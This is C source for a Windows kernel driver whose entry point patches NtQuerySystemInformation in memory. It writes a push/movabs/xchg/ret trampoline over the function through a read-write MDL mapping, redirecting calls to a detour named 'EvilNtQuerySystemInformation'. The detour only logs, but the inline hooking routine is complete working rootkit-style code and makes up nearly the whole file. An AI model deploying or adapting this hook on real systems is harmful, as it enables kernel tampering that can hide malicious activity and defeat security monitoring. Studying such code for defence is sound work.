#include <ntddk.h>
#include <windef.h>

#include "debug.h"

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemPathInformation,
    SystemProcessInformation,
    SystemCallCountInformation,
    SystemDeviceInformation,
    SystemProcessorPerformanceInformation,
    SystemFlagsInformation,
    SystemCallTimeInformation,
    SystemModuleInformation = 0x0B
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

//
// Our detour function
//
NTSTATUS EvilNtQuerySystemInformation
(
    IN  SYSTEM_INFORMATION_CLASS    SystemInformationClass,
    OUT PVOID                       SystemInformation,
    IN  ULONG                       SystemInformationLength,
    OUT PULONG                      ReturnLength
)
{
    KDBG("[Evil] Detour Called\n");
    return STATUS_SUCCESS;
}

NTSTATUS EvilForceCopyMemory(PVOID Address, PVOID Buffer, SIZE_T Size)
{
    PMDL mdl;

    //
    // allocate mdl
    //
    mdl = IoAllocateMdl(Address, Size, FALSE, FALSE, NULL);

    if (!mdl)
    {
        return STATUS_UNSUCCESSFUL;
    }

    //
    // lock the mdl in RAM to prevent paging
    //
    MmProbeAndLockPages(
        mdl,            // mdl
        KernelMode,     // access mode
        IoReadAccess    // operation
    );

    //
    // map to the virtual address
    //
    PVOID mappedVirtualAddress = MmMapLockedPagesSpecifyCache(
        mdl,                    // mdl
        KernelMode,             // access mode
        MmNonCached,            // cache type
        NULL,                   // requested address
        FALSE,                  // bug check
        NormalPagePriority      // priority
    );
    
    //
    // with read-write rights
    //
    MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);

    //
    // write the buffer into the mapped virtual address
    //
    RtlCopyMemory(mappedVirtualAddress, Buffer, Size);

    MmUnmapLockedPages(mappedVirtualAddress, mdl);
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);

    return STATUS_SUCCESS;
}

NTSTATUS PerformHook()
{
    KDBG_ENTER_FUNCTION();

    UNICODE_STRING routineNameUs;

    RtlInitUnicodeString(&routineNameUs, L"NtQuerySystemInformation");

    //
    // obtain an address of the target function to hook with
    //
    PVOID hookFunctionAddress = MmGetSystemRoutineAddress(&routineNameUs);

    if (!hookFunctionAddress)
    {
        KDBG("[Evil] Failed to find sys routine of NtQuerySystemInformation\n");

        KDBG_LEAVE_FUNCTION();

        return STATUS_NOT_FOUND;
    }

    KDBG("[Evil] NtQuerySystemInformation Found at 0x%llX\n", hookFunctionAddress);

    KDBG("[Evil] Preparing shellcode...\n");

    //
    // jmp shellcode
    // the trampoline
    //
    BYTE shell_code[] =
    {
        // push rcx
        0x51,

        // movabs rcx,0xOurFuncAddres (push into register as 64-bit value)
        0x48, 0xB9,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

        // xchg QWORD PTR [rsp],rcx (transpose operand)
        0x48, 0x87, 0x0C, 0x24,

        // ret
        0xC3
    };

    //
    // the our detour function address
    //
    UINT64 detourFunctionAddress = (UINT64)(&EvilNtQuerySystemInformation);

    KDBG("[Evil] Our detour function is at 0x%llX\n", detourFunctionAddress);

    //
    // place an address of our detour function into the shellcode
    //
    RtlCopyMemory(&shell_code[0x3], &detourFunctionAddress, sizeof(PVOID));

    KDBG("[Evil] Prepared!\n");
    KDBG("[Evil] Deploying shellcode...\n");

    //
    // deploy jmp shellcode into the destination
    //
    if (!NT_SUCCESS(
        EvilForceCopyMemory(hookFunctionAddress, &shell_code, sizeof(shell_code))
    ))
    {
        KDBG("[Evil] Failed to deploy shell code\n");
        return STATUS_UNSUCCESSFUL;
    }

    KDBG("[Evil] Shellcode deployed.\n");
    KDBG("[Evil] Done!\n");

    KDBG_LEAVE_FUNCTION();

    return STATUS_SUCCESS;
}

//
// this will be called when the driver being unloaded
//
VOID
Unload
(
    IN PDRIVER_OBJECT DriverObject
)
{
    UNREFERENCED_PARAMETER(DriverObject);
}

//
// this will be called after the driver loaded
//
NTSTATUS DriverInitialize
(
    IN PDRIVER_OBJECT DriverObject,
    IN PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    return STATUS_SUCCESS;
}

//
// main entry point of this driver
//
NTSTATUS DriverEntry
(
    IN PDRIVER_OBJECT DriverObject,
    IN PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = Unload;

    return PerformHook();
}
